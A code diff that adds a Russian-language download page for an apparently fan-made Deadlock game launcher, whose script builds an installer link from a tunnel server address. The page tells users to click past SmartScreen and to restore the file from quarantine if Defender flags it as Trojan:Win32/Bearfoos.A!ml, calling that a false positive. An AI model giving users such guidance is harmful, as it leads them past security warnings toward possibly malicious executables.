@@ -1,0 +1,37 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Deadlock Group Finder — установка</title>
+<style>
+  body { font: 16px/1.5 system-ui, sans-serif; background: #15120e; color: #e8dcc4; max-width: 640px; margin: 48px auto; padding: 0 20px; }
+  a.btn { display: inline-block; padding: 12px 22px; background: #c9a24a; color: #15120e; font-weight: 700; text-decoration: none; border-radius: 6px; }
+  a.btn[aria-disabled="true"] { opacity: .5; pointer-events: none; }
+  .muted { color: #a8987a; font-size: 14px; }
+</style>
+</head>
+<body>
+<h1>Deadlock Group Finder</h1>
+<p><a id="dl" class="btn" aria-disabled="true" href="#">Скачать установщик</a></p>
+<p id="state" class="muted">Получаю адрес сервера…</p>
+<h2>«Windows защитил ваш компьютер»</h2>
+<p>Установщик пока не подписан сертификатом, поэтому SmartScreen показывает синее окно. Это не значит, что найден вирус:
+нажмите <b>Подробнее</b>, затем <b>Выполнить в любом случае</b>.</p>
+<p>Если Защитник Windows удалил файл (например, <code>Trojan:Win32/Bearfoos.A!ml</code>), это ложное срабатывание эвристики
+<code>!ml</code>: «Безопасность Windows» → «Журнал защиты» → запись → «Восстановить». Не отключайте Защитник целиком.</p>
+<p class="muted">Лаунчер — фанатский инструмент с открытой лицензией MIT, не связан с Valve. Deadlock — игра Valve.</p>
+<script>
+// The installer lives on the launcher server (/dl/), whose address changes with the tunnel: read server.json.
+fetch('server.json?t=' + Date.now(), { cache: 'no-store' })
+  .then((r) => r.json())
+  .then((s) => {
+    const a = document.getElementById('dl');
+    a.href = String(s.url).replace(/\/+$/, '') + '/dl/DeadlockGroupFinder-Setup.exe';
+    a.removeAttribute('aria-disabled');
+    document.getElementById('state').textContent = 'После установки лаунчер сам обновится до последней версии.';
+  })
+  .catch(() => { document.getElementById('state').textContent = 'Сервер сейчас недоступен, попробуйте позже.'; });
+</script>
+</body>
+</html>
